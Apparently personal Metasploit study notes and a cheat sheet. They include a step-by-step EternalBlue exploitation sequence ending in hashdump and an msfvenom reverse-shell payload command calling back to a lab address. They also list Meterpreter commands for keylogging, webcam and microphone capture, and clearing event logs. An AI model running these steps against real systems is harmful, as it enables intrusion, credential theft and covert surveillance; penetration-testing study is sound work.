# Metasploit

## Background

Metasploit is an open-source exploitation framework that provides a platform to automate and simplify the process of discovering, exploiting and reporting vulnerabilities in a target system. The framework integrates a large collection of exploits, payloads, and auxiliary modules to aid in a wide range of security testing tasks.

## Installation

## Usage

The steps for using Metasploit include:

Installing and setting up the Metasploit Framework on your computer.
Finding a target and determining what vulnerabilities it may have.
Selecting and configuring an appropriate exploit module in Metasploit.
Launching the exploit against the target and assessing the results.
Post-exploitation activities, such as gathering information, installing backdoors, or pivoting to other systems.



`msfconsole`
`use`
`show options`
`info`
`search`
`search apache`
`search portscan`
`set PARAMETER_NAME VALUE`
`unset`
`setg`
`exploit -z`
`check`
`sessions -i`
`msfvenom`
`scanner/discovery/udp_sweep`
`msfdb init`
`db_status`
`workspace -h`
Use msfdb to use stored information about current project/workspace
Common vulnerable services:

* HTTP
* FTP
* SMB
* SSH
* RDP

To exploit eternal blue:

`msconsole`
`search eternalblue`
`use 0`
`show payloads`
`set payload 2`
`set RHOSTS {targetIP}`
`show options` (ensure lhosts = {attackIP})
`exploit`
Upon session connection, use CTRL+Z to put session in background
`use_shell_to_meterpreter`
`show options`
`set SESSION 1`
`sessions -u 1`
`hashdump`

Msfvenom: used to generate payloads

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`

Meterpreter: metasploit payload with pentesting components
Show meterpreter payloads: msfvenom --list payloads | grep meterpreter

Meterpreter Commands

Core commands

background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session

File system commands

cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory

Networking commands

arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table

System commands

clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
getuid: Shows the user that Meterpreter is running as
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS

Others Commands (these will be listed under different menu categories in the help menu)

idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database

Meterpreter Post Exploitation Commands

* getuid: user Meterpreter using
* ps: running processes
* Migrate: interacting with other processes: migrate PID
* Hashdump: dump content of SAM to get NTLM hashes
* Search: locate files: search -f */txt
* getsystem
* Load command

* Common paramaters:
  * RHOSTS
  * RPORT
  * PAYLOAD
  * LHOST
  * LPORT
  * SESSION


## Resources

* <https://docs.metasploit.com/>

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md>
<https://github.com/swisskyrepo/PayloadsAllTheThings>
<https://github.com/security-cheatsheet/metasploit-cheat-sheet>
<https://github.com/spy86/Metasploit-Cheat-Sheet>

* The Metasploit official documentation, which provides in-depth information on how to use the tool and its various features.
* Metasploit Unleashed, a free online resource that provides a comprehensive guide to using Metasploit, including tutorials and examples.
* Metasploit YouTube channel, which features a variety of tutorials and demonstrations on how to use Metasploit.
* Online forums and communities dedicated to Metasploit, where users can ask questions and share information.
* Metasploit Pro, a paid version of the tool that includes additional features and support options. This can be a good resource for users who want additional assistance and resources for using Metasploit.

https://nitesculucian.github.io/2018/12/01/metasploit-cheat-sheet/

https://github.com/security-cheatsheet/metasploit-cheat-sheet


https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md

https://subscription.packtpub.com/book/security/9781838980078/15/ch15lvl1sec96/cheat-sheets-for-metasploit-and-penetration-testing